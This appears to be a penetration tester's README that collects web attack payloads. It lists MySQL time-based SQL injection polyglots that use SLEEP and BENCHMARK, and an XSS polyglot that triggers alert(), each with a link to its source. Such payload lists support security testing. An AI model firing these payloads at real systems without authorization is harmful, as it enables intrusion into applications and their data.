# seclinks
Collection of my various security/penetration testing resources

SQL Injection:  
    MySQL universal SQLi payload (https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/):  
> IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/Payloads/SQLi_Polyglots.txt:

> SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/

> SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample


XSS:  
    XSS Polyglot (https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) 
> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e



